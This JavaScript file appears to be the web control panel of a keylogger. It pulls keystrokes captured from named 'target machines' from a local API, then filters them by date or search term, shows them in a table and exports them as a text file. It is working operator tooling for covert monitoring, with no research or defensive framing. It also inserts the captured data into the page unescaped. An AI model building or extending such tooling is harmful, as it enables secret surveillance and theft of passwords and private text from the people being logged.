document.addEventListener('DOMContentLoaded', function () {
    // Get URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const targetMachine = urlParams.get('machine');
    document.getElementById('machineName').textContent = targetMachine;

    const keystrokesOutput = document.getElementById('keystrokesOutput');
    keystrokesOutput.innerHTML = '<div class="text-center p-4">Loading...</div>';

    // Initial load of keystrokes
    getKeystrokes(targetMachine).then(displayKeystrokes);

    // Filter button click event
    document.getElementById('filterButton').addEventListener('click', function () {
        const startDate = document.getElementById('startDate').value;
        const endDate = document.getElementById('endDate').value;

        getKeystrokes(targetMachine).then(function (keystrokes) {
            if (!Array.isArray(keystrokes)) {
                keystrokesOutput.innerHTML = '<div class="text-center p-4">Error fetching data</div>';
                return;
            }
            const filteredKeystrokes = filterKeystrokesByDate(keystrokes, startDate, endDate);
            displayKeystrokes(filteredKeystrokes);
        });
    });

    // Clear button click event
    document.getElementById('clearButton').addEventListener('click', function () {
        document.getElementById('startDate').value = '';
        document.getElementById('endDate').value = '';
        document.getElementById('searchTerm').value = '';
        getKeystrokes(targetMachine).then(displayKeystrokes);
    });

    // Download button click event
    document.getElementById('downloadButton').addEventListener('click', function () {
        const startDate = document.getElementById('startDate').value;
        const endDate = document.getElementById('endDate').value;
        const searchTerm = document.getElementById('searchTerm').value.toLowerCase();

        getKeystrokes(targetMachine).then(function (keystrokes) {
            if (!Array.isArray(keystrokes)) {
                console.error('Error fetching keystrokes for download');
                return;
            }
            let filteredKeystrokes = keystrokes;
            if (startDate || endDate) {
                filteredKeystrokes = filterKeystrokesByDate(filteredKeystrokes, startDate, endDate);
            }
            if (searchTerm) {
                filteredKeystrokes = filterKeystrokesBySearchTerm(filteredKeystrokes, searchTerm);
            }
            console.log('filteredKeystrokes', filteredKeystrokes);
            downloadKeystrokes(filteredKeystrokes);
        });
    });

    // Search input event
    document.getElementById('searchTerm').addEventListener('input', function () {
        const searchTerm = this.value.toLowerCase();
        getKeystrokes(targetMachine).then(function (keystrokes) {
            if (!Array.isArray(keystrokes)) {
                keystrokesOutput.innerHTML = '<div class="text-center p-4">Error fetching data</div>';
                return;
            }
            const filteredKeystrokes = filterKeystrokesBySearchTerm(keystrokes, searchTerm);
            displayKeystrokes(filteredKeystrokes);
        });
    });
});

/**
 * Fetches keystrokes for the specified target machine.
 * @param {string} targetMachine - The target machine identifier.
 * @returns {Promise<Array>} A promise that resolves to an array of keystrokes.
 */
function getKeystrokes(targetMachine) {
    return fetch(`http://127.0.0.1:5000/api/get_keystrokes?target_machine=${targetMachine}`)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok: ' + response.statusText);
            }
            return response.json();
        })
        .then(data => data.keystrokes || [])
        .catch(error => {
            console.error('Error fetching keystrokes:', error);
            return [];
        });
}

/**
 * Filters keystrokes by date range.
 * @param {Array} keystrokes - The array of keystrokes.
 * @param {string} startDate - The start date in YYYY-MM-DD format.
 * @param {string} endDate - The end date in YYYY-MM-DD format.
 * @returns {Array} The filtered array of keystrokes.
 */
function filterKeystrokesByDate(keystrokes, startDate, endDate) {
    if (!Array.isArray(keystrokes)) return [];
    const start = startDate ? new Date(startDate + 'T00:00:00') : null;
    const end = endDate ? new Date(endDate + 'T23:59:59') : null;

    return keystrokes.filter(entry => {
        const timestamp = new Date(entry.timestamp);
        return (!start || timestamp >= start) && (!end || timestamp <= end);
    });
}

/**
 * Displays keystrokes in a table format.
 * @param {Array} keystrokes - The array of keystrokes.
 */
function displayKeystrokes(keystrokes) {
    const keystrokesOutput = document.getElementById('keystrokesOutput');
    keystrokesOutput.innerHTML = '';

    if (!keystrokes || keystrokes.length === 0) {
        keystrokesOutput.innerHTML = '<div class="text-center p-4">No data available</div>';
        return;
    }

    const table = document.createElement('table');
    table.className = 'table table-hover';

    const thead = document.createElement('thead');
    thead.innerHTML = `
        <tr>
            <th><i class="fas fa-clock me-2"></i>Timestamp</th>
            <th><i class="fas fa-keyboard me-2"></i>Data</th>
        </tr>
    `;
    table.appendChild(thead);

    const tbody = document.createElement('tbody');
    keystrokes.forEach(entry => {
        const row = document.createElement('tr');
        const timestamp = new Date(entry.timestamp).toLocaleString();
        row.innerHTML = `
            <td>${timestamp}</td>
            <td><code>${entry.data}</code></td>
        `;
        tbody.appendChild(row);
    });

    table.appendChild(tbody);
    keystrokesOutput.appendChild(table);
}

/**
 * Downloads the keystrokes as a text file.
 * @param {Array} keystrokes - The array of keystrokes.
 */
function downloadKeystrokes(keystrokes) {
    const keystrokesText = keystrokes.map(entry =>
        `${new Date(entry.timestamp).toLocaleString()} - ${entry.data}`
    ).join('\n');

    const blob = new Blob([keystrokesText], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'keystrokes.txt';
    a.click();
    URL.revokeObjectURL(url);
}

/**
 * Filters keystrokes by search term.
 * @param {Array} keystrokes - The array of keystrokes.
 * @param {string} searchTerm - The search term.
 * @returns {Array} The filtered array of keystrokes.
 */
function filterKeystrokesBySearchTerm(keystrokes, searchTerm) {
    if (!Array.isArray(keystrokes)) return [];
    return keystrokes.filter(entry =>
        entry.data.toLowerCase().includes(searchTerm) ||
        entry.timestamp.toLowerCase().includes(searchTerm)
    );
}